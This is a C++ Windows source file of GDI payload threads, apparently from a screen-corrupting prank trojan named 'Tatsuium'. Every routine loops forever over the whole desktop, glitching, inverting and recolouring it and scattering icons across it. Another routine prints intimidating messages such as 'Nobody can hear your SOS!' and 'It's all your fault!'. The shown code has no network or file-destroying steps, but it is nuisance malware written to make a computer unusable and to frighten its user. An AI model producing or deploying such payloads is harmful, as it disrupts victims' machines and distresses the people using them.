#include <iostream>
#include <windows.h>
#include <windowsx.h>
#include <cmath>
#include <stdio.h>
#include <tchar.h>
#include <ShlObj.h>
#include <time.h>
#include "GDIConfig.h"
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
LPCWSTR lpIconNames[] = { IDI_ERROR, IDI_INFORMATION, IDI_QUESTION, IDI_SHIELD, IDI_WARNING, IDI_WINLOGO };
LPCWSTR lpCursorNames[] = { IDC_APPSTARTING, IDC_ARROW, IDC_CROSS, IDC_HAND, IDC_HELP, IDC_IBEAM, IDC_ICON, IDC_NO, IDC_SIZE, IDC_SIZEALL, IDC_SIZENESW, IDC_SIZENS, IDC_SIZENWSE, IDC_SIZEWE, IDC_UPARROW, IDC_WAIT };

int RandomRGB() {
    int rgb = RGB(rand() % 255, rand() % 255, rand() % 255);
    return rgb;
}

int RefreshScreen() {
    RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN); InvalidateRect(0, 0, 0);
    Sleep(1);
    return 114514;
}

VOID WINAPI ci(int x, int y, int w, int h) {
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    SelectObject(hdc, hBrush);
    BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
    ReleaseDC(0, hdc);
    DeleteObject(hrgn); DeleteObject(hBrush);
}

int MyNewDrawIcon(int x, int y, int size, HICON hIcon) {
    HDC hdc = GetDC(0);
    DrawIconEx(hdc, x, y, hIcon, size, size, NULL, NULL, DI_NORMAL);
    ReleaseDC(0, hdc);
    DestroyIcon(hIcon); DeleteObject(hIcon);
    DeleteDC(hdc);
    return 1;
}

DWORD WINAPI DrawIconsAndCursors(LPVOID lpParam) {
    HICON hIcon; int size = 0;
    srand(time(NULL));
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        hIcon = LoadIcon(0, lpIconNames[rand() % 6]); size = 32 + rand() % 118;
        MyNewDrawIcon(rand() % w, rand() % h, size, hIcon);
        Sleep(20);
        hIcon = LoadCursor(0, lpCursorNames[rand() % 16]); size = 32 + rand() % 118;
        MyNewDrawIcon(rand() % w, rand() % h, size, hIcon);
        Sleep(20);
    }
}

DWORD WINAPI DrawTexts(LPVOID lpParam) {
    LPCSTR texts[12] = { "Tatsuium", "Element 2796", "Do you think I'm joking?", "Still using this computer?", "Do you like this feeling?", "You can't do anything about it!" , "Just give up, There's no hope!", "What were you thinking?", "It's all your fault!", "Sleeping forever", "get r3kt", "Nobody can hear your SOS!" };
    while (true) {
        int rdx = 1 + rand() % 3; int xxx = (rdx * 10) - 10;
        int tmp = rand() % 12, color = RGB(rand() % 255, rand() % 255, rand() % 255);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        SetBkMode(hdc, 0);
        SetTextColor(hdc, color);
        HFONT font = CreateFontA(50, 30, rand() % 100, rand() % 100, FW_DONTCARE, 0, 0, 0, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, "@");
        SelectObject(hdc, font);
        TextOutA(hdc, rand() % w, rand() % h, texts[tmp], strlen(texts[tmp]));
        ReleaseDC(0, hdc);
        DeleteObject(font);
        DeleteDC(hdc);
        Sleep(25);
    }
}

DWORD WINAPI MyIcons1(LPVOID lpParam) {
    int x = 0, y = 0, count = 0, i = 0;
    HICON tubiaoshuliang = ExtractIconA(0, "shell32.dll", -1);
    int nums = (int)tubiaoshuliang;
    srand(time(NULL));
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        x = tan(i / 1.01) * (w / 2) + (w / 2), y = cos(i / 1.02) * (h / 2) + (h / 2);
        HICON hIcon = ExtractIconA(0, "shell32.dll", rand() % nums);
        MyNewDrawIcon(x, y, 32, hIcon); i++;
        if (count == 20) { Sleep(50); count = 0; }
        else { count++; }
    }
}

DWORD WINAPI MyIcons2(LPVOID lpParam) {
    int radius = 32, count = 0; double chushi = 1;
    HICON tubiaoshuliang = ExtractIconA(0, "shell32.dll", -1);
    int nums = (int)tubiaoshuliang;
    srand(time(NULL));
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        int numCircles = (h / (radius + 4.5)) * radius;
        for (int i = 0; i < numCircles; i++) {
            int spiralRadius = i * chushi, x = ((w / 2) + radius) + spiralRadius * cos(i * 1.2), y = ((h / 2) + radius) + spiralRadius * sin(i * 1.2);
            HICON hIcon = ExtractIconA(0, "shell32.dll", rand() % nums);
            MyNewDrawIcon(x, y, 32, hIcon);
            if (count == 10) { count = 0; Sleep(20); }
            else { count++; }
        }
        if (chushi > 2.5) { chushi = 1; }
        else { chushi = chushi + 0.1; }
        Sleep(500);
    }
}

DWORD WINAPI cicici(LPVOID lpParam) {
    srand(time(NULL));
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        int size = 400 + ((1 + rand() % 14) * 100);
        int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;
        for (int i = 0; i < size; i += 100) {
            ci(x - i / 2, y - i / 2, i, i);
            Sleep(5);
        }
        Sleep(100);
    }
    return 0;
}

DWORD WINAPI Payload1(LPVOID lpParam) {
    int xxx = 0;
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), rnd = 1 + rand() % (h / 2);
        LPVOID MyMemoryAddress = VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); _RGBQUAD* data = (_RGBQUAD*)MyMemoryAddress;
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int bl = 0; bl < h; bl += rnd) {
            StretchBlt(hcdc, -2 + rand() % 5, bl, w, rnd, hcdc, 0, bl, w, rnd, SRCCOPY);
        }
        GetBitmapBits(hBitmap, w * h * 4, data);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            data[i].r &= i;  data[i].g *= i; data[i].b &= i;
            data[i].rgb ^= 1145 | (i + ((x + xxx) | (y + xxx)));
        }
        SetBitmapBits(hBitmap, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        VirtualFree(MyMemoryAddress, 0, MEM_RELEASE);
        Sleep(1); xxx += 10;
    }
}

DWORD WINAPI Payload2(LPVOID lpParam) {
    double angle = 0; BLENDFUNCTION blur = { AC_SRC_OVER, 0, 50, 0 };
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y += 20) {
            StretchBlt(hcdc, -5 + rand() % 11, y, w, 20, hcdc, 0, y, w, 20, SRCAND);
        }
        for (int x = 0; x < w; x += 20) {
            StretchBlt(hcdc, x, -5 + rand() % 11, 20, h, hcdc, x, 0, 20, h, SRCAND);
        }
        for (float i = 0; i < w; i += 0.99f) {
            int a = sin(angle) * 20;
            BitBlt(hcdc, i, 0, 1, h, hcdc, i, a, SRCCOPY);
            angle += 3.1415926 / 40;
        }
        for (float i = 0; i < h; i += 0.99f) {
            int a = cos(angle) * 24;
            BitBlt(hcdc, 0, i, w, 1, hcdc, a, i, SRCCOPY);
            angle += 3.1415926 / 40;
        }
        for (int kun = 0; kun < 5; kun++) {
            int x = rand() % w, y = rand() % h; HRGN hrgn = CreateEllipticRgn(x, y, x + 120, y + 120);
            SelectClipRgn(hcdc, hrgn);
            HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hcdc, hBrush);
            BitBlt(hcdc, x, y, w, h, hcdc, x, y, PATINVERT);
            DeleteObject(hrgn); DeleteObject(hBrush);
        }
        GdiAlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1);
    }
}

DWORD WINAPI Payload3(LPVOID lpParam) {
    int xxx = 0;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 0 }; PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbScreen[i].r += ((i + 2) / 2) * xxx + GetRValue(i + x * y);
            rgbScreen[i].g += ((i + 2) / 2) * xxx + GetGValue(i + x * y);
            rgbScreen[i].b += ((i + 2) / 2) * xxx + GetBValue(i + x * y);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(10); xxx += 10;
    }
}

DWORD WINAPI Payload4(LPVOID lpParam) {
    srand(time(NULL));
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), rndsize = 1 + rand() % (h / 2);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(bmpi), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int xxx = 0; xxx < w; xxx++) {
            StretchBlt(hcdc, xxx, -2 + rand() % 5, 1, h, hcdc, xxx, 0, 1, h, SRCCOPY);
        }
        for (int xxx = 0; xxx < w; xxx += rndsize) {
            StretchBlt(hcdc, xxx, -2 + rand() % 5, rndsize, h, hcdc, xxx, 0, rndsize, h, SRCCOPY);
        }
        for (int yyy = 0; yyy < h; yyy++) {
            StretchBlt(hcdc, -2 + rand() % 5, yyy, w, 1, hcdc, 0, yyy, w, 1, SRCCOPY);
        }
        for (int yyy = 0; yyy < h; yyy += rndsize) {
            StretchBlt(hcdc, -2 + rand() % 5, yyy, w, rndsize, hcdc, 0, yyy, w, rndsize, SRCCOPY);
        }
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                float fx = (4 * i) + ((4 * i) * sin(x / 24)) + (4 * i) + ((4 * i) * sin((y + i) / 24));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 1000.f, 1.f);
                hslcolor.s = 1.f;
                hslcolor.l += 0.1f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1); i += 4;
    }
}

DWORD WINAPI Payload5(LPVOID lpParam) {
    srand(time(NULL));
    int i = 0, jingui = 0;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), rndsize = 1 + rand() % (h / 2);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(bmpi), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int a = 0; a < h; a++) {
            StretchBlt(hcdc, -2 + rand() % 5, a, w, 1, hcdc, 0, a, w, 1, SRCCOPY);
        }
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                float fx = (4 * i) * sin((jingui + (x ^ y - i)) / 8);
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h += fmod(fx / 500.f, 1.f);
                hslcolor.s = 1.f;
                hslcolor.l = 0.5f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1); i += 5; jingui++;
    }
}

DWORD WINAPI Payload6(LPVOID lpParam) {
    srand(time(NULL));
    int xxx = 0; BLENDFUNCTION blur = BLENDFUNCTION{ AC_SRC_OVER, 1, 80, 0 };
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), rndsize = 1 + rand() % (h / 2), rndsize2 = 1 + rand() % (h / 2);
        BITMAPINFO bmi = { 0 }; PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbScreen[i].rgb += ((x ^ i) * (y ^ i) + i + xxx);
        }
        for (int yyy = 0; yyy < h; yyy += rndsize) {
            StretchBlt(hcdc, -2 + rand() % 5, yyy, w, rndsize, hcdc, 0, yyy, w, rndsize, SRCAND);
        }
        for (int yyy = 0; yyy < h; yyy += rndsize2) {
            StretchBlt(hcdc, -5 + rand() % 11, yyy, w, rndsize2, hcdc, 0, yyy, w, rndsize2, SRCCOPY);
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1); xxx += 4;
    }
}

DWORD WINAPI Payload7(LPVOID lpParam) {
    int xxx = 0;
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), rndsize = 1 + rand() % (h / 2);
        LPVOID MyMemoryAddress = VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); _RGBQUAD* data = (_RGBQUAD*)MyMemoryAddress;
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int yyy = 0; yyy < h; yyy += rndsize) {
            StretchBlt(hcdc, -2 + rand() % 5, yyy, w, rndsize, hcdc, 0, yyy, w, rndsize, SRCCOPY);
        }
        GetBitmapBits(hBitmap, w * h * 4, data);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            data[i].r &= i;  data[i].g += i; data[i].b |= i;
            data[i].rgb += 1145 ^ (i + xxx + ((x + xxx) ^ (y)));
        }
        SetBitmapBits(hBitmap, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        VirtualFree(MyMemoryAddress, 0, MEM_RELEASE);
        Sleep(1); xxx += 4;
    }
}

DWORD WINAPI Payload8(LPVOID lpParam) {
    int blocksize = 80, xxx = 0; POINT point[3];
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), rndsize = 1 + rand() % (h / 2), increment = 10 + rand() % 40;
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        for (int yyy = 0; yyy < h; yyy += rndsize) {
            StretchBlt(hcdc, -2 + rand() % 5, yyy, w, rndsize, hcdc, 0, yyy, w, rndsize, SRCCOPY);
        }
        for (int x = 0; x <= w; x += blocksize) {
            for (int y = 0; y <= h; y += blocksize) {
                int rndx = x + (-1 + rand() % 3), rndy = y + (-1 + rand() % 3);
                int rndx2 = x + (-1 + rand() % 3), rndy2 = y + (-1 + rand() % 3);
                int luckynum = 1 + rand() % 11, rop = SRCCOPY;
                if (luckynum == 5) { rop = SRCAND; }
                else if (luckynum == 10) { rop = SRCPAINT; }
                StretchBlt(hcdc, rndx, rndy, blocksize, blocksize, hcdc, rndx2, rndy2, blocksize, blocksize, rop);
            }
        }
        for (int i = 0; i < w * h; i++) {
            rgbScreen[i].rgb += i * h + xxx & (i % w + i / w) | i & (w + h) + xxx;
        }
        if (rand() % 8 >= 5) { BitBlt(hcdc, rand() % 4, rand() % 4, w, h, hcdc, rand() % 4, rand() % 4, SRCAND); }
        if (rand() % 10 >= 6) {
            point[0].x = increment; point[0].y = -increment;
            point[1].x = w + increment; point[1].y = increment;
            point[2].x = -increment; point[2].y = h - increment;
        }
        else {
            point[0].x = -increment; point[0].y = increment;
            point[1].x = w - increment; point[1].y = -increment;
            point[2].x = increment; point[2].y = h + increment;
        }
        PlgBlt(hcdc, point, hcdc, 0, 0, w, h, 0, 0, 0);
        BitBlt(hcdc, rand() % 10, rand() % 10, w, h, hcdc, rand() % 10, rand() % 10, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        blocksize += 2; if (blocksize >= 200) { blocksize = 80; }
        Sleep(10);
    }
}

DWORD WINAPI Payload9(LPVOID lpParam) {
    int i = 0, move = 20;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        for (int x = 0; x < w; x += move) {
            StretchBlt(hcdc, x, -5 + rand() % 11, move, h, hcdc, x, 0, move, h, SRCCOPY);
        }
        for (int y = 0; y < h; y += move) {
            StretchBlt(hcdc, -5 + rand() % 11, y, w, move, hcdc, 0, y, w, move, SRCCOPY);
        }
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                FLOAT fx = (x + (i + i * 20));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h += fmod(fx / 200, 1.f);
                hslcolor.s += 1.f;
                hslcolor.l = 0.5f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1); i++;
    }
}

DWORD WINAPI Payload10(LPVOID lpParam) {
    int i = 0; BLENDFUNCTION blur = { AC_SRC_OVER, 0, 80, 0 };
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), rndsize = 1 + rand() % (h / 2);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor; RGBQUAD rgbquadCopy;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int a = 0; a < h; a++) {
            StretchBlt(hcdc, -2 + rand() % 5, a, w, 1, hcdc, 0, a, w, 1, SRCCOPY);
        }
        for (int b = 0; b < h; b += rndsize) {
            StretchBlt(hcdc, -2 + rand() % 5, b, w, rndsize, hcdc, 0, b, w, rndsize, SRCCOPY);
        }
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int fx = (int)((2 ^ i) + ((2 & i) * tan((x ^ y) * 4)) + (2 * i));
                rgbquad[index].rgbRed -= fx + i;
                rgbquad[index].rgbGreen -= fx + i;
                rgbquad[index].rgbBlue -= fx + i;
            }
        }
        StretchBlt(hcdc, 0, 0, w, h, hcdc, 1, 1, w, h, SRCERASE);
        StretchBlt(hcdc, 1, 1, w, h, hcdc, 0, 0, w, h, SRCCOPY);
        for (int kun = 0; kun < 2; kun++) {
            int x = rand() % w, y = rand() % h; HRGN hrgn = CreateEllipticRgn(x, y, x + 100, y + 100);
            SelectClipRgn(hcdc, hrgn);
            BitBlt(hcdc, x, y, w, h, hcdc, x, y, NOTSRCCOPY);
            DeleteObject(hrgn);
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hdc); DeleteDC(hcdc);
        Sleep(1); i++;
    }
}

DWORD WINAPI Payload11(LPVOID lpParam) {
    srand(time(NULL));
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        LPVOID MyMemoryAddress = VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); RGBQUAD* data = (RGBQUAD*)MyMemoryAddress;
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(hBitmap, w * h * 4, data);
        int v = 1 + rand() % 25; BYTE byte = rand() % 0xff;
        for (int i = 0; i < w * h; i++) {
            ((BYTE*)(data + i + v))[v % 48] = ((BYTE*)(data + i))[v] ^ byte;
        }
        SetBitmapBits(hBitmap, w * h * 4, data);
        for (int yyy = 0; yyy < h; yyy++) {
            StretchBlt(hcdc, -1 + rand() % 3, yyy, w, 1, hcdc, 0, yyy, w, 1, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        VirtualFree(MyMemoryAddress, 0, MEM_RELEASE);
        Sleep(1);
    }
}

DWORD WINAPI Payload12(LPVOID lpParam) {
    srand(time(NULL));
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), rnd = rand() % 360, rndsize = 1 + rand() % (h / 2);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                FLOAT fx = ((x ^ y) + (i * 2) + rnd + (i * 10));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h += fmod(fx / 200, 1.f);
                hslcolor.s += 1.f;
                hslcolor.l = 0.5f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        for (int yyy = 0; yyy < h; yyy += rndsize) {
            StretchBlt(hcdc, -2 + rand() % 5, yyy, w, rndsize, hcdc, 0, yyy, w, rndsize, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCERASE);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1); i++;
    }
}

DWORD WINAPI Payload13(LPVOID lpParam) {
    srand(time(NULL));
    int block = 120; POINT point[3]; BLENDFUNCTION blur = { AC_SRC_OVER, 0, 80, 0 };
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), increment = 1 + rand() % 40, rndsize = 1 + rand() % (h / 2);
        int can1 = 1, jia1 = 0, jia2 = 0, x = 0; int y = 0;
        int x1 = 0, y1 = 0, x2 = 0, y2 = 0;
        bool bianliang1 = true;
        while (bianliang1) {
            jia1 = jia1 + block;
            if (jia1 > w) { bianliang1 = false; }
            else { can1 = can1 + 1; }
        }
        can1 = can1 + 1; bianliang1 = true;
        int can2 = 1;
        while (bianliang1) {
            jia2 = jia2 + block;
            if (jia2 > h) { bianliang1 = false; }
            else { can2 = can2 + 1; }
        }
        can2 = can2 + 1;
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = x * h + y;
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(0, 0);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        for (int jin = 0; jin < can2 + 1; jin++) {
            for (int gui = 0; gui < can1 + 1; gui++) {
                x = rand() % can1, y = jin;
                if (x == 1) { x1 = 0; }
                else if (x == 2) { x1 = block; }
                else { x1 = block * x - block; }

                if (y == 1) { y1 = 0; }
                else if (y == 2) { y1 = block; }
                else { y1 = block * y - block; }

                x = rand() % can1, y = rand() % can2;
                if (x == 1) { x2 = 0; }
                else if (x == 2) { x2 = block; }
                else { x2 = block * x - 1; }

                if (y == 1) { y2 = 0; }
                else if (y == 2) { y2 = block; }
                else { y2 = block * y - 1; }

                HBRUSH hBrush = CreateSolidBrush(RandomRGB());
                SelectObject(hcdc, hBrush);
                StretchBlt(hcdc, x1, y1, block, block, hcdc, x2, y2, block, block, PATINVERT);
                DeleteObject(hBrush);
            }
        }
        for (int yyy = 0; yyy < h; yyy += rndsize) {
            StretchBlt(hcdc, -2 + rand() % 5, yyy, w, rndsize, hcdc, 0, yyy, w, rndsize, SRCCOPY);
        }
        if (rand() % 10 >= 5) {
            point[0].x = increment; point[0].y = -increment;
            point[1].x = w + increment; point[1].y = increment;
            point[2].x = -increment; point[2].y = h - increment;
        }
        else {
            point[0].x = -increment; point[0].y = increment;
            point[1].x = w - increment; point[1].y = -increment;
            point[2].x = increment; point[2].y = h + increment;
        }
        PlgBlt(hcdc, point, hcdc, 0, 0, w, h, 0, 0, 0);
        BitBlt(hcdc, rand() % 5, rand() % 5, w, h, hcdc, rand() % 5, rand() % 5, SRCAND);
        BitBlt(hcdc, rand() % 10, rand() % 10, w, h, hcdc, rand() % 10, rand() % 10, SRCCOPY);
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(10);
    }
}

